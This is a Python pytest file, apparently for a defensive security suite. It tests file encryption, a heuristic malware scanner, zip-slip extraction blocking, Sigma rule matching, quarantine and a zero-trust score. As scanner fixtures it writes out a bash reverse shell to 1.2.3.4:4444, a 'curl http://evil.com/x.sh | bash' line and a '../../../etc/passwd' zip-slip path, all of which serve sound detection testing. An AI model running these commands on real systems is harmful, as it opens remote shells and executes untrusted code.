# tests/test_core.py
"""Tests unitarios de los módulos core."""
import os
import sys
import tempfile
import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestCrypto:
    def test_encrypt_decrypt_roundtrip(self):
        from core.crypto import CryptoEngine

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"Hello, World! This is a test.")
            input_path = f.name
        output_path = input_path + ".enc"
        decrypted_path = input_path + ".dec"

        try:
            CryptoEngine.encrypt_file(input_path, output_path, "test_password_123")
            assert os.path.exists(output_path)

            CryptoEngine.decrypt_file(output_path, decrypted_path, "test_password_123")
            with open(decrypted_path, 'rb') as f:
                assert f.read() == b"Hello, World! This is a test."
        finally:
            for p in (input_path, output_path, decrypted_path):
                if os.path.exists(p):
                    os.remove(p)

    def test_wrong_password_fails(self):
        from core.crypto import CryptoEngine

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"Secret")
            input_path = f.name
        output_path = input_path + ".enc"

        try:
            CryptoEngine.encrypt_file(input_path, output_path, "correct_pass")
            with pytest.raises(Exception):
                CryptoEngine.decrypt_file(output_path, input_path + ".dec", "wrong_pass")
        finally:
            for p in (input_path, output_path, input_path + ".dec"):
                if os.path.exists(p):
                    os.remove(p)


class TestHeuristic:
    def test_detects_reverse_shell(self):
        from core.heuristic import HeuristicEngine

        engine = HeuristicEngine({})
        with tempfile.NamedTemporaryFile(suffix='.sh', delete=False, mode='w') as f:
            f.write("#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
            path = f.name

        try:
            detections = engine.scan_file(path)
            assert len(detections) > 0
            assert any('reverse shell' in d['threat'].lower() for d in detections)
        finally:
            os.remove(path)

    def test_detects_curl_pipe(self):
        from core.heuristic import HeuristicEngine

        engine = HeuristicEngine({})
        with tempfile.NamedTemporaryFile(suffix='.sh', delete=False, mode='w') as f:
            f.write("#!/bin/bash\ncurl http://evil.com/x.sh | bash\n")
            path = f.name

        try:
            detections = engine.scan_file(path)
            assert any('curl' in d['threat'].lower() for d in detections)
        finally:
            os.remove(path)

    def test_clean_file(self):
        from core.heuristic import HeuristicEngine
        engine = HeuristicEngine({})
        with tempfile.NamedTemporaryFile(suffix='.txt', delete=False, mode='w') as f:
            f.write("This is a normal text file with no malware.")
            path = f.name
        try:
            detections = engine.scan_file(path)
            assert len(detections) == 0
        finally:
            os.remove(path)


class TestZipDefense:
    def test_zip_slip_blocked(self):
        import zipfile
        from core.zip_defense import SafeExtractor, ZipSecurityError

        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = os.path.join(tmpdir, "evil.zip")
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr("../../../etc/passwd", "malicious")

            extract_dir = os.path.join(tmpdir, "extract")
            with pytest.raises(ZipSecurityError):
                SafeExtractor.safe_extract_zip(zip_path, extract_dir)

    def test_safe_zip_extracts(self):
        import zipfile
        from core.zip_defense import SafeExtractor

        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = os.path.join(tmpdir, "safe.zip")
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr("file.txt", "safe content")

            extract_dir = os.path.join(tmpdir, "extract")
            result = SafeExtractor.safe_extract_zip(zip_path, extract_dir)
            assert result['extracted'] == 1
            assert os.path.exists(os.path.join(extract_dir, "file.txt"))


class TestSigma:
    def test_load_rules(self):
        from core.sigma_engine import SigmaEngine
        # Solo verifica que se puede instanciar
        engine = SigmaEngine({})
        assert hasattr(engine, 'rules')
        assert hasattr(engine, 'match')

    def test_match_simple_event(self):
        from core.sigma_engine import SigmaEngine

        engine = SigmaEngine({})
        # Añadir una regla de prueba
        engine.rules = [{
            'id': 'test-001',
            'title': 'Test Rule',
            'level': 'high',
            'detection': {
                'selection': {'process_name': 'evil.exe'},
                'condition': 'selection'
            }
        }]

        matches = engine.match({'process_name': 'evil.exe'})
        assert len(matches) == 1
        assert matches[0]['threat'] == 'Test Rule'


class TestSOAR:
    def test_quarantine_file(self):
        from core.soar import SOAREngine

        with tempfile.TemporaryDirectory() as qdir:
            engine = SOAREngine({'cuarentena': qdir})

            with tempfile.NamedTemporaryFile(delete=False, suffix='.test') as f:
                f.write(b"malware content")
                path = f.name

            result = engine.quarantine_file(path, "Test quarantine")
            assert result['success']
            assert not os.path.exists(path)  # Movido
            assert result['dest'] is not None

    def test_collect_forensics(self):
        from core.soar import SOAREngine
        engine = SOAREngine({})
        with tempfile.TemporaryDirectory() as tmpdir:
            result = engine.collect_forensics(tmpdir)
            assert result['success']
            assert len(result['files']) > 0


class TestZeroTrust:
    def test_score_computed(self):
        from core.zero_trust import ZeroTrustScorer
        scorer = ZeroTrustScorer({})
        result = scorer.compute_score()
        assert 0 <= result['score'] <= 100
        assert result['grade'] in ('A', 'B', 'C', 'D', 'F')
        assert 'findings' in result


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
